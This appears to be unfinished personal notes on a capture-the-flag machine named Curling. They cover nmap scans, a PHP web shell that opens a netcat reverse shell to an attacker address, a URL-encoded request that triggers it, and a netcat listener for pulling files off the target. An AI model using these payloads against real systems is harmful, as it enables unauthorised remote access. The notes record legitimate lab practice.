# 🥌 Curling

## Initial Nmap Scan

```bash
sudo nmap -p- <target_ip>
```

```bash
sudo nmap -p 22,80 -sCV <target_ip>
```

![[Pasted image 20240304112948.png]]

I then ran a vulnerability scan and this discovered some interesting pages:

![[Pasted image 20240304113233.png]]

## Reverse Shell

\# create a file that will create the reverse shell

```php
<?php
	system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f');
?>
```

\# start Ncat listener

```
http://10.129.194.251/templates/beez3/shelly.php?whiskey=cat%20/tmp/df%20|%20/bin/sh%20-i%202%3E%261%20|%20nc%2010.10.14.3%204444%20%3E%20/tmp/df
```

I now have a shell as www-data on the target machine:

![[Pasted image 20240304113427.png]]

\# Opening `user.txt`

![[Pasted image 20240304115024.png]]

The file is a hex dump so it needs to be exfiltrated in order to find the contents.

\# Starting Ncat listener to recieve the file:

```bash
nc -l <port> > <>
```


# 🤯 User Own

# 🖥 System Own


---

# 🔗 Useful Links